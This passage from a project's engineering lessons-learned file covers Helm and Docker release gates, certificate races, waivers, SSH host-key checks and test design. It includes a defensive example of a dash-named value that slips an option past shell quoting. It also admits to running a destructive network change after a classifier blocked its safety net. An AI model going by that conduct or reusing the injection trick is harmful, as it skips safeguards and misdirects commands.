    is writing" becomes a distinguishable outcome rather than a corrupted read. An
    exclusive create is that primitive; on shared network storage `os.Mkdir` is the one
    with no history of ambiguity.
  - Back off with JITTER. Processes started together by one orchestrator wake together,
    and an unjittered schedule keeps them in lockstep for every round, which is precisely
    the symmetry backing off exists to break.
  - Never let the verified thing and the used thing be two separate reads. The same bug
    had a second face: `Ensure` verified a pair and returned two PATHS, the listener
    re-read those paths, and another racer replaced them in between, so a controller
    logged that it was listening and then died on "private key does not match public key".
    Return the material, not a path to fetch it again.

**Where else this applies.** Anything that provisions a shared resource at start-up and
retries: a schema migration, a leader lease, a first-run bootstrap record, a directory of
generated keys. The question to ask of each is "if I lose every round, what do I return?",
and the only acceptable answer is "whatever the winner produced".

## 120. A gate that installs a product has to type the operator's command line, and its skip/fail boundary is a position in the test rather than a class of error

**The incident.** Phase 20's Release Gate proves a real install of this repository's
shipped artifacts twice: `docker compose up -d --wait` on a Docker host, and `helm install`
into a real Kubernetes cluster from images built on the same machine with no registry
anywhere in the path. Two design questions came up while building it, and both had an
attractive wrong answer.

**The first: what is the test allowed to call?** A Go client for the Docker API would have
been tidier, faster and easier to assert on. It would also have proved that the Docker API
works. The claim under test is not that: it is that the command lines printed in
`docker-compose.yml`'s header, in the chart's `NOTES.txt` and in
`docs/10-running-in-production.md` do what they say. So every step of the gate shells out
to the real `docker`, `kind`, `kubectl` and `helm` binaries, with the same arguments in the
same order those documents print. When the documented form changes, the gate breaks, which
is the entire value.

Two consequences that look like inconvenience and are not. The bootstrap goes through
`docker compose run --rm -T controller bootstrap-admin --password-stdin` rather than
inserting a row, because a seeded row proves the schema works and says nothing about the
command. And the certificate that the sign-in trusts is fetched with
`docker compose cp controller:/data/tls/cert.pem`, out of band through the Docker socket,
so the trust anchor did not come from the connection being tested; a client with
`InsecureSkipVerify` would have passed against anything at all answering on that port.

**The second: when may a gate skip?** A gate that fails on a machine without kind teaches
its developers to ignore red gates, and a gate that skips whenever anything goes wrong
proves nothing. The boundary that resolved it is not a category of error, it is a POSITION:
which step first touches an artifact this repository produces.

  - Before that step, everything is provisioning. A missing tool skips. A kind cluster that
    cannot be created skips, after three attempts, because etcd loses elections when it
    shares a disk with a container image build (FAILURE_PATTERNS #130) and because at that
    point in the test the chart has not been rendered, the images have not been imported
    and no Pleiades process has started. Nothing under test can be implicated in that
    failure, so reporting one would be a false accusation.
  - From that step onward, nothing is retried and nothing skips. `helm install`, the
    readiness wait, the readiness document, the sign-in and the bootstrap each get one
    attempt, because a failure in any of them is a statement about the artifact.

The same rule decides what a warning is worth. The cold `docker compose up` is measured and
logged with no threshold, because the number is dominated by a Go compile and says nothing
about the packaging; the warm start is measured more than once, judged on the FASTEST
sample against the real target and on EVERY sample against a much looser ceiling, so one
contended sample cannot fail the build while a uniformly slow stack still does.

**Where else this applies.** Any test that stands up infrastructure it does not own:
container-backed conformance suites, cluster installs, anything that provisions a database
before exercising a migration. Write down which line is the first one that touches your own
code, and put the retries, the skips and the tolerance strictly above it.

## 121. A name that has to fit a length limit is built by truncating the prefix and appending the meaning, never the reverse

**The incident.** The Helm chart named four workloads by appending `-controller`, `-runner`,
`-postgres` or `-nats` to a release-scoped prefix and then cutting the result to 63
characters. For any release name between 49 and 53 characters, every one of them legal to
Helm, the cut landed inside the appended half and removed it entirely, so all four workloads
rendered under one name and the objects overwrote each other on install (FAILURE_PATTERNS
#131).

**The rule.** In `name = prefix + meaning`, the meaning is the part a reader needs and the
prefix is the part they scroll past, so a length limit has to be spent on the prefix. Cut the
prefix to `limit - len(longest meaning)` first, then append. One budget shared by every
component keeps the names of one release aligned, which is worth more than the handful of
extra characters a per-component budget would save.

**The test that goes with it.** A rule about the EDGE of a limit cannot be proven at the
default. The check renders at the last length that worked, the first that did not, and the
maximum the tool itself permits, and it asserts three separate things: that no two objects
share a kind and name, that each name still ends with its component (a name truncated to
`-c` is distinct and still useless), and that each name fits the limit ITS OWN kind is held
to rather than the strictest limit in the API. That last clause matters: holding a
PersistentVolumeClaim to the 63 characters a Service is held to would fail a legal
configuration, and a linter that fails legal configurations teaches people to work around
the linter.

## 122. Truthiness is the wrong question for any setting where zero is a legal answer, and an absent object needs an assertion of its own

**The incident.** A PodDisruptionBudget template chose between `minAvailable` and
`maxUnavailable` with `{{- if .Values...minAvailable }}`. The chart's own default for that
key is `""` and `0` is falsy too, so "not set" and "deliberately zero" were the same value to
the template, and one ordinary combination rendered no budget at all: `kubectl get pdb` was
empty for a release whose values said disruption protection was on (FAILURE_PATTERNS #132).

**The rule.** Ask whether a value was STATED, not whether it is truthy. In Helm that is a
helper treating nil and `""` as unset and everything else, including `0`, as set; in Go it is
a pointer or an `ok` return. Then refuse the combinations that cannot be rendered into a
working object, both-set and neither-set, with the reason attached, rather than picking one
silently.

**The half that is easy to miss.** Every check that iterates over rendered objects passes
when the object is missing, so the defect that hid longest, an object that silently did not
render, is invisible to all of them. The count of objects a configuration must produce is its
own assertion. The same shape applies to any linter, any release gate and any "we validate
the output" claim: validating what was produced says nothing about what was not.

## 123. When a resource deliberately outlives the release that created it, stamp it so the next release can recognize it

**The incident.** `helm uninstall` correctly leaves the PostgreSQL claim behind, and
PostgreSQL only applies its credentials to an EMPTY data directory, so reinstalling under the
same release name with a different password produced a healthy database, a controller that
could never authenticate to it, and a permanent crash loop with nothing naming the cause
(FAILURE_PATTERNS #133).

**The rule.** Any object that survives an uninstall is state the next install will inherit
without knowing anything about it. Put an identifier ON the surviving object at creation (a
hash of the credentials that initialized it, never the credentials themselves), read it back
before rendering, and refuse on a proven mismatch. Say which choice keeps the data and which
destroys it, name the object, and print the command.

**The three limits that have to be stated with it.** A cluster read (`lookup`) returns
nothing without a cluster, so the check is silent under `helm template` and its only honest
proof is a real uninstall-and-reinstall against a real cluster. A stamp the chart cannot
compute (credentials from an operator-managed Secret) or a claim it did not create means no
evidence, and no evidence means render rather than guess. And the surface the stamp lives on
has its own rules: `volumeClaimTemplates` is immutable on a live StatefulSet, so a change to
the stamp that is not also a credential change has to go through uninstall and install.

## 124. A lock is the wrong primitive for work that is cheap, idempotent and self-verifying: make the result atomic instead and let everyone race

**The incident.** Provisioning a self-signed certificate for a directory several controllers
share was serialized behind an exclusive claim. Four separate defects were filed against it,
and they were one defect wearing four hats: a holder that was killed, a holder that could not
release, a holder that was merely slow, and a renewal where the slow holder split the fleet.
Every one of them was "one bad holder blocks everyone", and every proposed tuning (a longer
budget, a shorter staleness window) produced a fifth face (FAILURE_PATTERNS #134).

**The rule.** Before serializing writers, ask three questions about the work being guarded.
Is it cheap? Is it idempotent? Are any two results interchangeable? Certificate generation is
milliseconds, produces a complete result or none, and any valid pair is as good as any other,
so the honest answer is that a second writer costs a few milliseconds of wasted CPU and
nothing else. The lock was buying protection against a cost nobody was paying, and charging
for it in startup refusals.

**What replaces it.** Make the published RESULT atomic rather than the act of producing it,
and end on a read. Two files could not be replaced in one step, which is the only reason a
lock looked necessary, so the certificate and its key became one file and publishing became
one `rename(2)`. The loop is then: load; if what is there cannot be served, mint and publish;
load again and serve whatever is there now. Racers converge because the last rename stands
and every reader adopts it; nobody waits, so nobody can be blocked.

**What it costs, stated rather than hidden.** Two processes can briefly serve different
certificates, because one may re-read before another's rename. That is acceptable HERE for
reasons that must be checked before this pattern is copied: the certificates authenticate
nothing a client has not been handed directly, every one of them is recorded so a health
probe accepts any of them, and the state converges on the next restart. If any of those had
been false, the answer would have been a different atomic unit, not a lock.

## 125. Provenance has to travel inside the atomic unit it describes, or a second writer can separate them

**The incident.** With the lock gone, the record of "which certificates this deployment
provisioned" was still a single file that every writer read, prepended itself to, and wrote
back. Under sixteen-way contention a writer's entry could be erased by another writer's
copy, and the process serving the certificate behind the erased entry failed its own
healthcheck against a listener that was working perfectly (FAILURE_PATTERNS #135).

**The rule.** Two questions look alike and are not. "May I replace this?" is asked about the
material that is published right now, so the answer belongs INSIDE the published file: the
serving bundle carries a provenance block naming the fingerprint of the certificate in the
same file, which cannot be separated from it by anything, because the file is replaced whole
by one rename. "What has this deployment ever published?" is a set that grows, so it cannot
live in one file, and it must never be maintained by read-modify-write; one file per member,
named after the member, is the version of that set no writer can damage.

**The test that proves it.** Not a unit test of the writer. Sixteen writers released at the
same instant against one directory, asserting that every one of their certificates is still
trusted afterwards, asked the way the healthcheck asks it. The single-file version passed
every test written about its contents and failed this one about a third of the time.

## 126. A written waiver has to carry the condition it depends on, or it outlives the reason it was granted

**The rule.** When a check is waived because of a fact about the world, record the fact as
something the tooling re-evaluates, not only as a sentence a human would have to re-read.
A waiver with no expiry condition is a comment, and comments do not notice when the world
moves.

**Where this came from.** The chart renders the runner container with no liveness probe, no
readiness probe and no startup probe, and `tools/helm-lint` allowed it through a written,
per-container waiver, in the same shape `gosec-waivers.json` requires of every accepted
finding: no blanket exemption, no exemption by kind, and no exemption without a sentence
saying why. The sentence was true and remains true. `cmd/runner` binds no port, has no HTTP
surface, and its image is distroless, so there is nothing inside the pod for a probe to ask;
the binary is the only executable in the image, and it treats an unrecognised first argument
as an ordinary start, so an exec probe of it would launch a second agent into the consumer
group every few seconds. The waiver was the right call.

What made it fragile is that the sentence names a fact about ANOTHER package. The waiver
holds only while `cmd/runner` has no healthcheck subcommand. The day somebody adds one,
which is exactly what closes the FOUND-NOT-FIXED failure this waiver stands in for
(`FAILURE_PATTERNS.md` #119: a runner whose NATS connection closes for good stays alive,
stays healthy-looking, and silently stops doing any work), the chart keeps shipping a
container with no probes, every test in the repository stays green, and nothing anywhere
connects the new subcommand to the chart edit it enables. The person who lands that code is
not the person who wrote the waiver, and nobody re-reads a waiver they did not write.

**What it looks like applied.** The waiver entry now carries the package it depends on, the
literal whose arrival ends it, and the remedy written out in advance. The linter re-reads
that package on every run and fails, naming the chart edit, the moment the condition stops
holding. The check is text matching over Go source, which is deliberate and is stated where
it lives: the question is not what a symbol means but whether a subcommand by that name has
appeared, and being wrong in the only direction it can be wrong costs a build failure that
names an edit somebody was about to make anyway.

**The general shape.** Every waiver, suppression and known-issue note is a claim of the form
"this is acceptable BECAUSE X". X is the part that expires. If X is checkable, check it. If
X is not checkable, that is worth knowing before granting the waiver, because it means the
waiver has no way to end.

## 127. A protection must name what it protects, and refusing to overwrite is not the same promise as refusing to start

**The rule.** Write the protection against the specific thing whose loss cannot be undone,
not against the category it belongs to. And keep the two refusals apart: declining to
overwrite a file costs nothing and can be generous, while declining to START costs a
deployment its availability and has to be earned.

**The incident.** `internal/tlscert` had one rule for a whole directory: never replace
material it could not prove it wrote. "Material" turned out to be four different things.
A private key, which is worth every bit of that protection, because it exists in exactly one
place. A certificate, which is public by construction and cannot be served without the key
that is not beside it. Bytes that do not parse, which nothing can serve and nobody can lose.
And a file that could not be READ, whose contents are unknown, which the rule reported as
somebody else's secret.

The result was a directory no controller could ever start in again, reachable from states the
package itself produces: a `serving.pem` truncated by a process killed mid-write, a file at
0600 met by a controller running as a different user. The message told the operator their own
material was in the way and named a setting that would not have helped.

The fix separated the two questions. "May I publish here?" is asked about a private key and
nothing else. "May I overwrite this particular file?" keeps the stricter answer, because a
stale convenience copy harms nobody. Bytes that do not parse now block nothing and are still
never rewritten, which is both halves at once.

**The general shape.** When a rule can refuse forever, enumerate the states it refuses in and
count how many of them your own code can produce. If the answer is not zero, the rule is not
protecting a user from a mistake, it is protecting a file from its author.

## 128. A set that decides whether a live process is healthy must be governed by a fact about that process

**The rule.** When membership of a set determines whether a running process is judged healthy,
every eviction rule has to be a statement about what that process can still be doing, not
about the size or age of the set. Housekeeping convenience is not a fact about a replica.

**The incident.** The provenance records in `internal/tlscert` are the container
healthcheck's trust anchors. They were bounded by "keep the sixteen newest" and "never delete
one under an hour old". Both are facts about the directory. A controller serves the material
it loaded at start-up for as long as its process lives, so a replica up for longer than the
grace window, in a directory that had seen more than sixteen certificates, lost its anchor
the moment a sibling wrote one more, and then failed every probe for the rest of its life
while serving perfectly. An orchestrator answers that by killing it.

Neither number could be tuned into correctness: any count is wrong for a fleet one replica
larger, and any age is wrong for an uptime one hour longer. The rule that works is the
certificate's own expiry, because an expired certificate fails every handshake whether or not
a record for it exists, so after that moment nobody can legitimately be presenting it.

The same incident had a second half worth stating on its own: a replica that REUSED what it
found wrote nothing, so its membership of the set depended on another writer's file staying
where it was. Every process that is going to be judged against a set should put its own
answer into that set, in a place no other writer can touch.

**The general shape.** Ask what event makes a member genuinely unusable by everybody, and
evict on that. If no such event exists, the set does not shrink, and the honest thing is to
say what bounds its growth instead of inventing a cap that will kill somebody.

## 129. A run whose infrastructure is removed reports the assertion, never the removal

**The rule.** Anything that cleans up shared infrastructure must first ask whether a live
process is holding it, and that question has to be a fact about a process rather than about
the age, the size or the tidiness of the infrastructure. Without it a cleanup does not merely
break a run: it fabricates a defect in whatever that run was testing, because the failure is
reported at the assertion that happened to be executing.

**The incident.** A Kubernetes release gate failed at its long-release-name case, timing out
for eight minutes and then finding the API server refusing connections. Every particular of
it was credible: that boundary is where this chart has had two real defects, both about names
being truncated into collisions, and the error named both StatefulSets as not ready. The
cluster had been deleted out from under the run by an unrelated cleanup. Running the same
test alone passed in 259 seconds, with the install that had consumed its whole budget
finishing in 67. FAILURE_PATTERNS.md #141 has the full account.

The general trap is that a removed resource and a broken product are indistinguishable from
inside the test. The test cannot report "my cluster was deleted", because it does not know;
it reports the last thing it asked for and did not get. So the misattribution is not a
reading error, it is the only reading available, and the only place it can be prevented is in
whatever did the removing.

**What the guard has to be keyed on.** The tool written in response asks two questions, and
the shape of both matters more than either. Is a testcontainers reaper running, which proves
a session is open and its containers are held? Is a `go test` process running with its
working directory inside this repository, which proves a run exists before it has provisioned
anything? Neither covers the other's window, and both are statements about a live process.
The rules that suggest themselves first are all statements about the resource instead, "older
than an hour", "more than sixteen of them", "not currently running", and every one of them is
wrong for the run that is slower, larger or momentarily stopped. That is the same failure
LESSONS_LEARNED #128 records about certificate trust anchors, arriving from the opposite
direction: there a housekeeping rule evicted a live replica's anchor, here a housekeeping
rule would evict a live run's containers.

**The second half: the name is the bug.** The reason a cleanup could collide at all is that
the infrastructure was identified by a constant, and a constant has no owner. The gate names
its cluster `pleiades-release-gate` and deletes any cluster of that name before creating its
own, which is right for reclaiming what a killed predecessor left and cannot distinguish that
from a live sibling. A guard in the cleanup tool mitigates the external actor; it does
nothing for two concurrent runs, because both of them believe the name is theirs. Shared
names need either a per-run suffix or a liveness check, and picking neither is picking the
race.

**The general shape.** When you write anything that removes state somebody else might be
using, the question to answer is not "is this state stale?" but "can I name the process that
would miss it?" If the answer is no because nothing records an owner, the missing owner is
the defect, and a cleanup that guesses is worse than one that refuses.

## 130. A guard that only skips writing the zero value is invisible at the field it guards

**The rule.** When an option or setter's whole effect is declining to assign, and the value
it declines to assign is the field's zero value, the field cannot tell you whether the guard
ran. Asserting on it produces a test that passes against both versions of the code. The
guard's real contract is about ORDER or REPETITION, so that is what the test has to state:
apply the real value first, then the skipped one, and assert the real one survived.

**The incident.** `WithHeartbeat` is a functional option carrying `if hb != nil { a.liveness
= hb }`, and its doc comment promises "a nil hb is ignored". The obvious test builds an Agent
with `WithHeartbeat(nil)` and asserts `liveness` is nil. Deleting the guard left that test
green, because `liveness` is a concrete `*Heartbeat`: the unguarded assignment stores nil and
the guarded one stores nothing, and the field is nil in both. The comment written alongside
the test made it worse by explaining a mechanism that does not apply here, a non-nil
interface holding a nil pointer, which would have been a real distinction if the field were
an interface and is not one for a pointer.

What the guard actually protects is the option list. Options are applied in sequence, so
without it a later `WithHeartbeat(nil)` clears a heartbeat an earlier option already set.
That is not a contrived ordering: a composition root that threads an optional heartbeat
through a shared `[]AgentOption` produces exactly this call sequence, and the result is a
Runner whose liveness probe has nothing to read while every unit test still passes. Stated
that way, the test fails on the unguarded version and passes on the real one.

**The general shape.** Ask what state distinguishes "the guard ran" from "the guard did not",
and check that the answer is not the zero value. If it is, the observable is somewhere else,
usually in what happens on the second call. This is #95's "prove an assertion can fail"
narrowed to the case that most resists it, because here the assertion looks like it is about
the value when it is really about the write.

## 131. An assertion anchored to the developer's environment passes hardest where it matters least

**The rule.** A test's reference point has to be a property of the artifact, never of the machine
the artifact happens to be sitting on. If the denominator, the path, the directory name or the
neighbouring files can differ between a laptop and CI, the assertion is about the environment and it
will pass in the place nobody is watching and fail in the place everybody is.

**The incident, which happened three times in one session and twice in CI.**

A `tools/breakglass` constant held the docker compose project name as `"auto-roboto"`, which is what
compose derives from the enclosing DIRECTORY. CI checks the same commit out into `the-pleiades/`, so
the tool's own drift guard failed there while passing locally. Fixed by declaring `name:` in
`docker-compose.yml` and asserting the constant against that, which is two independent sources rather
than a restatement of where somebody cloned the repository.

Then, on the very next run, the packaging release gate failed on "the build context must be under 33
percent of the working tree". The context was 11.7 MiB in both places and had not changed. The
DENOMINATOR moved: a developer tree here carries about 61 MiB of `.git`, 120 MiB of agent working
directories and a pile of stale binaries, none of which the packaging has anything to do with, while
a fresh checkout is 18.9 MiB of almost pure source. Locally 3.03 percent, on CI 61.93 percent.

The second one is the more instructive because the rule was INVERTED as an incentive: the messier the
working tree, the easier it passed, and the hardest case was the clean checkout that CI and every new
contributor actually have. Its own comment had estimated "closer to 15 percent" for a fresh clone and
was out by a factor of four, which is what a guess about somebody else's directory is worth. The same
comment already admitted the ratio was the weak assertion and named the two strong ones beside it.

**What replaced it was nothing.** The absolute ceiling on the context, the paths that must never be
in it and the paths that must be were all already asserted and all passed on both machines. The ratio
was a proxy for those three and weaker than any of them, so deleting it removed a false signal and
lost no coverage. That is the usual shape: an environment-anchored assertion is almost always a proxy
sitting next to the direct measurement it is proxying for.

**The general shape.** When a test fails only in CI, do not start by asking what CI does differently.
Ask what the assertion is anchored to, and whether that anchor is part of the thing being tested. If
it is not, the fix is not to widen the bound until both environments fit, which is how a gate becomes
decoration, but to re-anchor it or to delete it in favour of whatever was already measuring the real
property.

132. **A layering rule that forbids reaching for shared code owes that code a home on the allowed
side of the line, and the debt comes due as a duplicated security control rather than as
duplicated convenience.**

**The incident.** `internal/archtest`'s `TestCatalogPackagesImportOnlyPkg` forbids a Collection
package from importing anything in this module outside `pkg/`. That rule is correct: it is the
constraint a third-party Collection will have to satisfy, and a built-in that quietly reached
into `internal/` would be proving a pattern nobody outside this repository can follow. But
nothing under `pkg/` did SSH, so the one SSH-backed Collection wrote its own dial, its own
authentication and its own host key verification, and its own doc comment recorded that it had
therefore lost the circuit breaker and the retry the transport layer already had.

**Why the shape matters.** The duplication that a missing shared home produces is not random. It
is exactly the code nobody wants to write twice, which is exactly the code that is hard enough to
be worth centralizing: the retry policy, the breaker, the fail-closed check. Convenience code
gets rewritten cheaply and correctly. A second implementation of host key verification is one
implementation and one liability, and the second one is always the one nobody reviews as hard.

**The general shape.** When a layering rule blocks an import, ask what the blocked caller was
reaching for. If the answer is a mechanism rather than a detail, the rule has created an
obligation to put that mechanism where both sides can reach it, and the obligation is due before
the second caller arrives, not after twenty of them have each solved it privately. Moving it is
better than copying it: `internal/transport/ssh` kept its port identity and became a thin adapter
over `pkg/remoteexec`, which is what let its container tests against a real, independent sshd
pass unchanged and prove the move preserved behavior.

133. **A comment explaining that something is empty "because nothing needs it yet" is a
dependency between two future changes with nothing to enforce it, and the feature that needs it
will not read the comment.**

**The incident.** `cmd/pleiades/run.go` handed every Collection method an empty secret set, with
a comment saying so: "which is empty here because no method in the catalog needs a device secret
yet." That was true when written. It stopped being true the moment `net.ssh.ping` landed, and
nothing linked the two. The result was that `pleiades run` could not run any credential-needing
Collection method at all, failing with an authentication error against a device whose credential
was on disk, and the failure sat there through an entire phase because the only tests that
exercised those methods called them directly rather than through the CLI.

**Why the comment made it worse rather than better.** A reader who found the failure would reach
the comment and read a justification, not a gap. The comment described a state of the world
instead of an obligation, so it aged into an explanation for a bug.

**The general shape.** When a composition root deliberately supplies nothing, write down what
must happen before the first real consumer arrives, and prefer a mechanism to a sentence: a
failing test named for the missing wiring, or a refusal at construction. Where neither fits, at
least state it as a future obligation ("the first method needing a credential must wire the store
in here") rather than as a present fact, so the next reader sees a task instead of a rationale.

134. **When two copies of a value are unavoidable, the test comparing them is what makes the
duplication safe, and it belongs in the same change that creates the second copy.**

**The incident.** A Collection method's documentation lives twice: once in
`internal/forge/catalogdata`, the data the Forge is driven from, and once in the generated file,
because the scaffold template only emits `Doc.Summary` and everything else is hand-written
afterward. Nothing compared them. Writing the comparison while adding a third such method found
that two already-shipped methods had drifted: both carried an Example the catalog data did not
have. The visible cost was not stale prose. A regeneration would have silently dropped those
Examples, and the documentation generator's own completeness gate requires an Example on an
implemented method, so a from-scratch regeneration would have produced a tree that failed its own
gate for a reason nothing in the diff explained.

**The general shape.** "These two must stay in step" is either a test or a wish. Note also what
the test is worth beyond preventing drift: it found two existing defects on its first run, which
is the usual return on writing the comparison late rather than never. Compare field by field
rather than with a whole-struct equality, so the failure names which field moved instead of
printing two thirty-line literals and leaving the reader to diff them.

135. **A guard duplicated for defense in depth hides its own coverage: mutating one copy changes
no test outcome, so the earlier copy looks redundant right up until somebody deletes it.**

**The incident.** `pkg/remoteexec` consults its circuit breaker twice, once in `Connect` before
any other work and once inside the dial retry loop. A source-mutation pass over the new tests
found that removing the check in `Connect` broke nothing: the loop's own check produced the same
"circuit open" error, so every assertion still passed. The earlier check is not redundant. It is
what makes the doc comment's promise true, that an open circuit costs zero work, since without it
the host key source is loaded and parsed before the refusal.

**The fix that generalizes.** The test that pins it does not assert the error text, which both
copies produce. It arranges for the later path to be unreachable in a distinguishable way, an
open circuit plus a known_hosts path that does not exist, and asserts the error is about the
circuit rather than about host key verification. The general form is: to cover the earlier of two
identical guards, make the work between them fail loudly, and assert that failure did not happen.

**Why this class is easy to miss.** Reading the code, both checks look necessary and the tests
look thorough. Only mutation exposes it, and only mutation of each copy separately. A pass that
removes both at once sees a failure and concludes, wrongly, that both are covered.

**Correction, same session, and it inverts the conclusion above.** An adversarial review then
found that the two calls were not merely uncovered, they were a defect. `Allow` is not a query:
on an open circuit whose cooldown has elapsed it hands out the single half-open probe and mutates
the state to record that it did. The first call took the probe and did not dial; the second saw a
probe in flight and refused; nothing dialed, so nothing recorded an outcome, and the state never
left half-open. A device that was briefly down became permanently unreachable for the life of the
process. The defect predated this work in `internal/transport/ssh` and was carried into a
`pkg/` primitive with three callers, which is what made it worth finding.

So the covering test above was real and the reasoning under it was half right. What the mutation
pass actually established was that the two calls were indistinguishable to every test, and the
right response to that was to ask why there were two, not to write a test that made the pair look
deliberate. **The stronger rule: when a mutation shows two guards are indistinguishable, suspect
the duplication before you defend it, and check whether the shared call has a side effect.** A
pure predicate can safely be asked twice. A transaction cannot, and "Allow" reads like a
predicate.

136. **A test that cannot fail against the defect it names is worse than no test, and only
restoring the broken code proves which one you wrote.**

**The incident.** A defect in how standard input was piped to a remote command turned successful
commands into opaque failures. The regression test was written first in the package that owns the
code, against an in-process SSH server. It passed. It also passed against the broken version,
because the in-process handler never developed the timing that produces the failure: a real
/bin/sh with real os/exec plumbing between the channel and the process is what makes the remote
close the channel while the copy is still writing. The working test had to live in a different
package, one layer up, where a real shell is on the far end.

**The general shape.** Put the regression test where it demonstrably fails, even when that is not
where the code lives, and say in the comment why it is there. Then leave the contract test in the
owning package if it is worth having, but do not let its comment claim to be the regression proof.
The only way to know which one you wrote is to restore the broken code and watch.

137. **Quoting stops word splitting and expansion; it does not stop option parsing.**

**The incident.** A module built `cd '<dir>' && <command>` with the directory correctly
single-quoted, which defeats every injection the quoting was there for. It does not defeat `cd`'s
own argument parsing: `cd '-P'` is identical to `cd -P`, which is a valid flag with no operand, so
`cd` succeeds into the home directory and the command then runs somewhere the author never named,
reporting success. The `&&` that was already there to stop a bad directory could not help, because
`cd` had not failed.

**The general shape.** Every value interpolated as an operand needs `--` before it as well as
quotes around it. Test it both ways: that a dash-named value is refused, and that a directory
genuinely named `-P` still works, since "make everything with a dash fail" is a different and
also wrong fix.

138. **A guard and the work it guards must resolve relative paths in the same place, or the guard
is decoration.**

**The incident.** A module ran its command under a working directory and checked its idempotence
predicate without one, so a relative `creates` was evaluated wherever the account happened to log
in. The `creates` case is a silent no-op: the guard never fires and the command re-runs forever,
which is merely wrong. The `removes` case is worse. The check looked in the login directory, found
nothing, concluded the work was already done, and skipped the task, leaving the file it was
supposed to delete sitting untouched while the run reported success.

**The second half of the rule.** Once the check runs under a directory, "I could not enter that
directory" becomes a third possible answer, and it must not collapse into "the path is not there."
Collapsing them puts the failure back: a `removes` guard reads an unenterable directory as an
absence and skips. The fix is a distinct exit status the caller can tell apart, and an error
rather than a boolean when it appears.

**The general shape.** Whenever a predicate and an action are computed separately, list the
context each one depends on and check that both get the same. And when a predicate can fail to
evaluate, that is a third outcome, never a default to either answer.

## 139. A security control needs a channel that reaches the process that enforces it, and a container is a different process from a laptop

**The rule.** Before shipping a control that fails closed, name the channel each deployment uses
to satisfy it, and prove that channel reaches the code doing the enforcing in the arrangement the
product ships. If the only channel is the developer's own environment, the control is off in
production and on in the tests.

**The incident.** Every SSH connection Pleiades makes verifies the device's host key against a
known_hosts file and fails closed. That was written carefully, tested thoroughly, and completely
unusable in the shipped runner image, because the only way to name the file was
`$HOME/.ssh/known_hosts` and a distroless container has no home directory. `os.UserHomeDir`
failed, so every SSH task refused, and the only setting that worked was the one that turns
verification off. Four call sites all passed an empty path and none of them could have passed
anything else: a Collection method builds its own options from task parameters, and task
parameters are the runbook, not the deployment.

**What the shape of the fix says.** The channel had to be an environment variable read inside
`pkg/remoteexec` itself, which is normally a smell. It is right here because under the Walk tier
a Collection method runs in a per-task child process with no composition root of its own, so a
value wired at startup cannot reach it; the environment is what a child inherits. One read in one
place fixed all four call sites. The related discipline: it is a PATH and never a POLICY. There
is deliberately no variable that turns verification off, because a variable set once is forgotten
while a task parameter sits in the runbook where review can see it.

**The other half, which is about tests.** Every SSH gate in the repository manufactured the
affordance it was testing against: set `HOME`, write a known_hosts, run. That is right for
proving the mechanism and is exactly what hid the fact that nothing supplies the input in
production. The gate that closes it uses a deliberately different arrangement, and its value is
entirely in the difference. Where a test sets up what the deployment is supposed to provide, add
one that does not.

## 140. When a fix is blocked on a hard design question, check whether the hard half is load-bearing

**The rule.** A finding written up as "blocked on a design decision" deserves one pass to
separate the expensive question from the cheap one. Two questions welded together in a write-up
will be scheduled as one, at the price of the harder.

**The incident.** The runner's host key defect was recorded, correctly, as needing a decision
about where a stateless runner's known_hosts comes from for a fleet chosen at dispatch time.
That is a real and unsolved fleet-management question, and it kept the item at "highest priority,
not fixed" for a session. It also was not what was broken. Where the host keys COME FROM is hard;
where the file IS is a property of a process, and every SSH tool answers it with a setting. The
second half was the whole outage and took one function, three layers of packaging and an
afternoon. The first half is still open and is now merely a feature rather than an outage.

**How to apply it.** When re-reading a deferred finding, ask what the smallest change is that
moves the product from "cannot work" to "works when configured". Ship that, and let the
remaining question stay a question. Note the tell in the original write-up: it said "fixing the
image is necessary but not sufficient", which was true about the feature and false about the
outage.

## 141. Ask whether a property belongs to the method or to the run before putting it on the manifest

**The rule.** A manifest describes what is true of a method for every invocation. Before adding a
field, construct two runs of the same method, with the same parameters, against devices in
different states, and check whether the field's value differs. If it does, the field does not
belong there: it belongs in what the run emits.

**The incident.** `Manifest.Inverse` named the method that undoes each Collection method, plus the
prior-state keys a rollback would feed it. It was coherent, enforced at registration, rendered on
every generated documentation page, and wrong. Starting a service that was already running must
undo to nothing rather than to a stop. Creating a directory undoes to a removal, but fixing an
existing directory's mode undoes to the old mode, and the static declaration named the removal, so
a rollback acting on it would have deleted a directory the run never created. An HTTP request is
read-only or destructive depending on a parameter.

**The tell, which is generalizable.** The field carried a `Captures` list: the names of the values
someone else would need in order to interpret the declaration. That is the signature of a
declaration that is really half a computation, and the missing half is the half that knows the
answer. A declaration needing an interpreter is a sign the data is in the wrong place.

**What replaced it.** The manifest answers only whether the method can ever be undone, with a
reason required when it cannot. The run emits the concrete instruction, already parameterized from
what it found. An absent instruction became meaningful, which the static form could not express: it
is how a converged run says that undoing it means doing nothing.

**Also worth keeping:** this came from a user reading one method's declaration and saying it was
too generic to be useful. The generic case is a good place to test a design, because a field that
cannot describe the most general member of a set usually cannot describe the specific ones either;
it just fails less visibly.

## 142. Reconcile before deleting, and treat a failure in an untouched package as an environment fact

**The rule.** Before removing anything a tool generated (a worktree, a container, a cache), verify
that nothing in it is unintegrated. And when a test fails in a package the change did not touch,
suspect the environment before the diff.

**The incident.** A test asserting a configuration file appears exactly once in the repository
failed, reporting 19 copies: one real, eighteen inside leftover agent worktrees, each of which is a
full checkout. The worktrees were deleted to clear it, and only afterward checked for unintegrated
work. It was safe, because copying results out to a directory outside the repository was part of the
workflow's contract, but the check came after the irreversible step.

**How to apply it.** The reconciliation itself is cheap and worth doing every time: diff each
produced file against the copy in the main tree, and check every branch for commits ahead of the
target. Both were clean here, which is what made the report honest rather than reassuring. Note
also that worktree branches survive `git worktree remove`, so committed work stays reachable even
when the checkout does not.

## 143. When the mitigation for a risk becomes unavailable, re-make the decision instead of inheriting it

A lab VM was lost converting its adapter from DHCP to a static address. The runbook that did it was
originally written WITH a safety net: a scheduled task that reverted to DHCP after ten minutes
unless a later step disarmed it, because losing the box was the foreseeable failure and there would
be no remote way back in. The harness classifier blocked that runbook for looking like persistence.
The net was removed and the change was run anyway.

The reasoning error was not "the risk was misjudged". It was that the judgement "this risk is
acceptable" had been formed WITH the net in place and was then carried across the removal of the
net unexamined. A conclusion is only valid under the premises that produced it, and the premise had
just changed.

Later in the same session the identical shape recurred with the opposite polarity. Permission was
explicitly asked for and given, and the thing that then broke the box was a SECOND conversion the
question had never separated out: "run the destructive half" was presented as one decision when it
was two operations, and only the first had actually been reasoned about. Getting consent does not
transfer the obligation to know what is being consented to.

